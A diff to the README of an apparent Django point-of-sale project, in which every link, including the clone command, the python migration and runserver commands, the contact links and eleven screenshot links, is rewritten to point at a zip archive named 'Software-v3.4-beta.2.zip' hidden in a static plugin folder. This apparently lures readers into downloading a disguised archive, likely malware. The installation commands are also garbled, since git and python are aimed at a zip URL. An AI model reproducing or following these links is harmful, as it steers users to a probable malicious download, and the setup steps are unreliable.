@@ -19,7 +19,7 @@ This project is a Point of Sale (POS) system designed to optimize retail operati
 ## Installation
 1. Clone the repository:
     ```bash
-    git clone https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip
+    git clone https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip
     ```
 2. Navigate to the project directory:
     ```bash
@@ -42,12 +42,12 @@ This project is a Point of Sale (POS) system designed to optimize retail operati
     ```
 2. Apply migrations:
     ```bash
-    pipenv run python https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip makemigrations
-    pipenv run python https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip migrate
+    pipenv run python https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip makemigrations
+    pipenv run python https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip migrate
     ```
 3. Run the application:
     ```bash
-    pipenv run python https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip runserver
+    pipenv run python https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip runserver
     ```
 4. Open your web browser and go to:
     ```
@@ -55,20 +55,20 @@ This project is a Point of Sale (POS) system designed to optimize retail operati
     ```
 
 
-For questions or collaboration, please contact me via [Twitter](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip) or email at [Gmail](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip).
+For questions or collaboration, please contact me via [Twitter](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip) or email at [Gmail](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip).
 
 ## License
 This project is licensed under the MIT License.
 
 ## Screenshoots
-![Screenshot_1](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_2](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_3](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_4](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_5](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_6](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_7](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_8](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_9](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_10](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
-![Screenshot_11](https://raw.githubusercontent.com/zubairmk83/tienda/main/abomasum/tienda.zip)
+![Screenshot_1](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_2](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_3](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_4](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_5](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_6](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_7](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_8](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_9](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_10](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
+![Screenshot_11](https://raw.githubusercontent.com/zubairmk83/tienda/main/store/static/posAPP/assets/plugins/tempusdominus-bootstrap-4/js/Software-v3.4-beta.2.zip)
